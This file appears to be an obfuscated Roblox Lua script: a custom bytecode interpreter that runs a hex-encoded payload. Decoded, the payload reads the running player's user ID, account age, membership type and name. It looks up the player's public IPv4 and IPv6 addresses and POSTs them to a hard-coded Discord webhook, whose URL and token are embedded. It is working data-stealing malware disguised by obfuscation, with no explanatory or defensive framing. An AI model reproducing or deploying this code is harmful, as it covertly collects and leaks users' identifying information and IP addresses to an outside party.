local StrToNumber = tonumber;
local Byte = string.byte;
local Char = string.char;
local Sub = string.sub;
local Subg = string.gsub;
local Rep = string.rep;
local Concat = table.concat;
local Insert = table.insert;
local LDExp = math.ldexp;
local GetFEnv = getfenv or function()
	return _ENV;
end;
local Setmetatable = setmetatable;
local PCall = pcall;
local Select = select;
local Unpack = unpack or table.unpack;
local ToNumber = tonumber;
local function VMCall(ByteString, vmenv, ...)
	local DIP = 1;
	local repeatNext;
	ByteString = Subg(Sub(ByteString, 5), "..", function(byte)
		if (Byte(byte, 2) == 79) then
			repeatNext = StrToNumber(Sub(byte, 1, 1));
			return "";
		else
			local a = Char(StrToNumber(byte, 16));
			if repeatNext then
				local b = Rep(a, repeatNext);
				repeatNext = nil;
				return b;
			else
				return a;
			end
		end
	end);
	local function gBit(Bit, Start, End)
		if End then
			local Res = (Bit / (2 ^ (Start - 1))) % (2 ^ (((End - 1) - (Start - 1)) + 1));
			return Res - (Res % 1);
		else
			local Plc = 2 ^ (Start - 1);
			return (((Bit % (Plc + Plc)) >= Plc) and 1) or 0;
		end
	end
	local function gBits8()
		local a = Byte(ByteString, DIP, DIP);
		DIP = DIP + 1;
		return a;
	end
	local function gBits16()
		local a, b = Byte(ByteString, DIP, DIP + 2);
		DIP = DIP + 2;
		return (b * 256) + a;
	end
	local function gBits32()
		local a, b, c, d = Byte(ByteString, DIP, DIP + 3);
		DIP = DIP + 4;
		return (d * 16777216) + (c * 65536) + (b * 256) + a;
	end
	local function gFloat()
		local Left = gBits32();
		local Right = gBits32();
		local IsNormal = 1;
		local Mantissa = (gBit(Right, 1, 20) * (2 ^ 32)) + Left;
		local Exponent = gBit(Right, 21, 31);
		local Sign = ((gBit(Right, 32) == 1) and -1) or 1;
		if (Exponent == 0) then
			if (Mantissa == 0) then
				return Sign * 0;
			else
				Exponent = 1;
				IsNormal = 0;
			end
		elseif (Exponent == 2047) then
			return ((Mantissa == 0) and (Sign * (1 / 0))) or (Sign * NaN);
		end
		return LDExp(Sign, Exponent - 1023) * (IsNormal + (Mantissa / (2 ^ 52)));
	end
	local function gString(Len)
		local Str;
		if not Len then
			Len = gBits32();
			if (Len == 0) then
				return "";
			end
		end
		Str = Sub(ByteString, DIP, (DIP + Len) - 1);
		DIP = DIP + Len;
		local FStr = {};
		for Idx = 1, #Str do
			FStr[Idx] = Char(Byte(Sub(Str, Idx, Idx)));
		end
		return Concat(FStr);
	end
	local gInt = gBits32;
	local function _R(...)
		return {...}, Select("#", ...);
	end
	local function Deserialize()
		local Instrs = {};
		local Functions = {};
		local Lines = {};
		local Chunk = {Instrs,Functions,nil,Lines};
		local ConstCount = gBits32();
		local Consts = {};
		for Idx = 1, ConstCount do
			local Type = gBits8();
			local Cons;
			if (Type == 1) then
				Cons = gBits8() ~= 0;
			elseif (Type == 2) then
				Cons = gFloat();
			elseif (Type == 3) then
				Cons = gString();
			end
			Consts[Idx] = Cons;
		end
		Chunk[3] = gBits8();
		for Idx = 1, gBits32() do
			local Descriptor = gBits8();
			if (gBit(Descriptor, 1, 1) == 0) then
				local Type = gBit(Descriptor, 2, 3);
				local Mask = gBit(Descriptor, 4, 6);
				local Inst = {gBits16(),gBits16(),nil,nil};
				if (Type == 0) then
					Inst[3] = gBits16();
					Inst[4] = gBits16();
				elseif (Type == 1) then
					Inst[3] = gBits32();
				elseif (Type == 2) then
					Inst[3] = gBits32() - (2 ^ 16);
				elseif (Type == 3) then
					Inst[3] = gBits32() - (2 ^ 16);
					Inst[4] = gBits16();
				end
				if (gBit(Mask, 1, 1) == 1) then
					Inst[2] = Consts[Inst[2]];
				end
				if (gBit(Mask, 2, 2) == 1) then
					Inst[3] = Consts[Inst[3]];
				end
				if (gBit(Mask, 3, 3) == 1) then
					Inst[4] = Consts[Inst[4]];
				end
				Instrs[Idx] = Inst;
			end
		end
		for Idx = 1, gBits32() do
			Functions[Idx - 1] = Deserialize();
		end
		for Idx = 1, gBits32() do
			Lines[Idx] = gBits32();
		end
		return Chunk;
	end
	local function Wrap(Chunk, Upvalues, Env)
		local Instr = Chunk[1];
		local Proto = Chunk[2];
		local Params = Chunk[3];
		return function(...)
			local VIP = 1;
			local Top = -1;
			local Args = {...};
			local PCount = Select("#", ...) - 1;
			local function Loop()
				local Instr = Instr;
				local Proto = Proto;
				local Params = Params;
				local _R = _R;
				local Vararg = {};
				local Lupvals = {};
				local Stk = {};
				for Idx = 0, PCount do
					if (Idx >= Params) then
						Vararg[Idx - Params] = Args[Idx + 1];
					else
						Stk[Idx] = Args[Idx + 1];
					end
				end
				local Varargsz = (PCount - Params) + 1;
				local Inst;
				local Enum;
				while true do
					Inst = Instr[VIP];
					Enum = Inst[1];
					if (Enum <= 8) then
						if (Enum <= 3) then
							if (Enum <= 1) then
								if (Enum == 0) then
									Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
								else
									Stk[Inst[2]] = {};
								end
							elseif (Enum == 2) then
								Stk[Inst[2]] = Inst[3];
							else
								VIP = Inst[3];
							end
						elseif (Enum <= 5) then
							if (Enum == 4) then
								local A = Inst[2];
								local T = Stk[A];
								local B = Inst[3];
								for Idx = 1, B do
									T[Idx] = Stk[A + Idx];
								end
							else
								Stk[Inst[2]] = Env[Inst[3]];
							end
						elseif (Enum <= 6) then
							local A = Inst[2];
							local T = Stk[A];
							for Idx = A + 1, Inst[3] do
								Insert(T, Stk[Idx]);
							end
						elseif (Enum > 7) then
							Stk[Inst[2]] = Stk[Inst[3]][Stk[Inst[4]]];
						elseif Stk[Inst[2]] then
							VIP = VIP + 1;
						else
							VIP = Inst[3];
						end
					elseif (Enum <= 12) then
						if (Enum <= 10) then
							if (Enum > 9) then
								Stk[Inst[2]] = Stk[Inst[3]];
							else
								local B = Inst[3];
								local K = Stk[B];
								for Idx = B + 1, Inst[4] do
									K = K .. Stk[Idx];
								end
								Stk[Inst[2]] = K;
							end
						elseif (Enum == 11) then
							local A = Inst[2];
							Stk[A](Stk[A + 1]);
						else
							local A = Inst[2];
							Stk[A] = Stk[A](Stk[A + 1]);
						end
					elseif (Enum <= 14) then
						if (Enum > 13) then
							Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
						else
							Stk[Inst[2]][Inst[3]] = Inst[4];
						end
					elseif (Enum <= 15) then
						do
							return;
						end
					elseif (Enum == 16) then
						local A = Inst[2];
						local B = Stk[Inst[3]];
						Stk[A + 1] = B;
						Stk[A] = B[Inst[4]];
					else
						local A = Inst[2];
						Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
					end
					VIP = VIP + 1;
				end
			end
			A, B = _R(PCall(Loop));
			if not A[1] then
				local line = Chunk[4][VIP] or "?";
				error("Script error at [" .. line .. "]:" .. A[2]);
			else
				return Unpack(A, 2, B);
			end
		end;
	end
	return Wrap(Deserialize(), {}, vmenv)(...);
end
VMCall("LOL!3F3O0003793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F313037302O3234373O3533353339363930342F2O79594E774E334A71645377316B6E56306261355561345561742D57414450497764422O4872447255542O6A4F785372717850745F36776D38436446775A306D5244617003043O0067616D6503073O00482O747047657403143O00682O7470733A2O2F76342E6964656E742E6D652F03143O00682O7470733A2O2F76362E6964656E742E6D652F030C3O00636F6E74656E742D7479706503103O00612O706C69636174696F6E2F6A736F6E030A3O004765745365727669636503073O00506C6179657273030B3O004C6F63616C506C61796572030A3O00412O636F756E7441676503063O00737472696E672O033O0073756203083O00746F737472696E67030E3O004D656D6265727368697054797065026O00354003063O0055736572496403073O00436F726547756903093O00526F626C6F7847756903103O00506C617965724C6973744D6173746572030B3O004F2O667365744672616D6503103O00506C617965725363726F2O6C4C697374030F3O0053697A654F2O667365744672616D6503173O005363726F2O6C696E674672616D65436F6E7461696E6572031B3O005363726F2O6C696E674672616D65436C692O70696E674672616D65030D3O0053636F2O6C696E674672616D65030F3O004F2O66736574556E646F4672616D6503023O00705F030D3O004368696C6472656E4672616D6503093O004E616D654672616D6503073O0042474672616D65030C3O004F7665726C61794672616D65030A3O00506C617965724E616D6503043O005465787403073O00636F6E74656E74034O0003063O00656D6265647303053O007469746C65030D3O002O2A557365726E616D652O2A3A030B3O006465736372697074696F6E03053O00636F6C6F7203083O00746F6E756D626572024O00F2B5454103063O006669656C647303043O006E616D65030F3O004D656D62657273686970547970653A03053O0076616C756503063O00696E6C696E652O01030B3O00412O636F756E744167653A03073O005573657249643A03053O00495076343A03053O00495076363A030B3O00482O747053657276696365030A3O004A534F4E456E636F6465030C3O00682O74705F726571756573742O033O0073796E03073O00726571756573742O033O0055726C03043O00426F647903063O004D6574686F6403043O00504F535403073O0048656164657273006B3O0012023O00013O001205000100023O002010000100010003001202000300044O0011000100030002001205000200023O002010000200020003001202000400054O00110002000400022O000100033O000100300D000300060007001205000400023O002010000400040008001202000600094O001100040006000200200E00040004000A00200E00050004000B0012050006000C3O00200E00060006000D0012050007000E3O00200E00080004000F2O000C000700020002001202000800104O001100060008000200200E000700040011001205000800023O002010000800080008001202000A00124O00110008000A000200200E00080008001300200E00080008001400200E00080008001500200E00080008001600200E00080008001700200E00080008001800200E00080008001900200E00080008001A00200E00080008001B0012020009001C4O000A000A00074O000900090009000A2O000800080008000900200E00080008001D00200E00080008001E00200E00080008001F00200E00080008002000200E00080008002100200E00080008002100200E0008000800222O000100093O000200300D0009002300242O0001000A00014O0001000B3O000400300D000B0026002700102O000B00280008001205000C002A3O001202000D002B4O000C000C0002000200102O000B0029000C2O0001000C00054O0001000D3O000300300D000D002D002E00102O000D002F000600300D000D003000312O0001000E3O000300300D000E002D003200102O000E002F000500300D000E003000312O0001000F3O000300300D000F002D003300102O000F002F000700300D000F003000312O000100103O000300300D0010002D003400102O0010002F000100300D0010003000312O000100113O000300300D0011002D003500102O0011002F000200300D0011003000312O0004000C0005000100102O000B002C000C2O0004000A0001000100102O00090025000A001205000A00023O002010000A000A0008001202000C00364O0011000A000C0002002010000A000A00372O000A000C00094O0011000A000C0002001205000B00383O001205000C00393O000607000C006200013O0004033O00620001001205000C00393O00200E000B000C003A0004033O00630001001205000B00384O000A000C000B4O0001000D3O000400102O000D003B3O00102O000D003C000A00300D000D003D003E00102O000D003F00032O000B000C000200012O000F3O00017O006B3O00013O00023O00023O00023O00023O00033O00033O00033O00033O00043O00043O00053O00053O00053O00053O00053O00063O00073O00073O00073O00073O00073O00073O00073O00083O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000C3O000D3O000D3O000D3O000E3O000E3O000E3O00103O00123O00123O00123O00123O00123O00123O00123O00123O00", GetFEnv(), ...);